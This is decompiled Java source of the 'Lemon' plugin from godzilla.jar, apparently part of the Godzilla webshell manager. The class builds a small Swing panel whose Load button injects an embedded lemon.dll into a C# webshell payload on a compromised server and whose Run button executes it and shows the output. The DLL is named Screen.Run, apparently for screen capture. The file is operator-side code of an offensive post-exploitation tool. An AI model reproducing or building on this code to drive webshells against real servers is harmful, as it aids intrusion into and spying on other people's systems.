/*     */ package shells.plugins.cshap;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "lemon", DisplayName = "柠檬")
/*     */ public class Lemon
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "Screen.Run";
/*     */   private final JPanel panel;
/*     */   private final JButton loadButton;
/*     */   private final JButton runButton;
/*     */   private final JSplitPane splitPane;
/*     */   private final RTextArea resultTextArea;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public Lemon() {
/*  42 */     this.panel = new JPanel(new BorderLayout());
/*  43 */     this.loadButton = new JButton("Load");
/*  44 */     this.runButton = new JButton("Run");
/*  45 */     this.resultTextArea = new RTextArea();
/*  46 */     this.splitPane = new JSplitPane();
/*     */     
/*  48 */     this.splitPane.setOrientation(0);
/*  49 */     this.splitPane.setDividerSize(0);
/*     */     
/*  51 */     JPanel topPanel = new JPanel();
/*  52 */     topPanel.add(this.loadButton);
/*  53 */     topPanel.add(this.runButton);
/*     */     
/*  55 */     this.splitPane.setTopComponent(topPanel);
/*  56 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*     */     
/*  58 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/*  61 */             Lemon.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/*  65 */     this.panel.add(this.splitPane);
/*     */   }
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/*  69 */     if (!this.loadState) {
/*     */       try {
/*  71 */         InputStream inputStream = getClass().getResourceAsStream("assets/lemon.dll");
/*  72 */         byte[] data = functions.readInputStream(inputStream);
/*  73 */         inputStream.close();
/*  74 */         if (this.payload.include("Screen.Run", data)) {
/*  75 */           this.loadState = true;
/*  76 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */         } else {
/*  78 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */         } 
/*  80 */       } catch (Exception e) {
/*  81 */         Log.error(e);
/*  82 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */       } 
/*     */     } else {
/*     */       
/*  86 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/*  90 */     byte[] result = this.payload.evalFunc("Screen.Run", "run", new ReqParameter());
/*  91 */     this.resultTextArea.setText(this.encoding.Decoding(result));
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/*  96 */     this.shellEntity = shellEntity;
/*  97 */     this.payload = this.shellEntity.getPayloadModule();
/*  98 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/*  99 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 106 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\cshap\Lemon.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */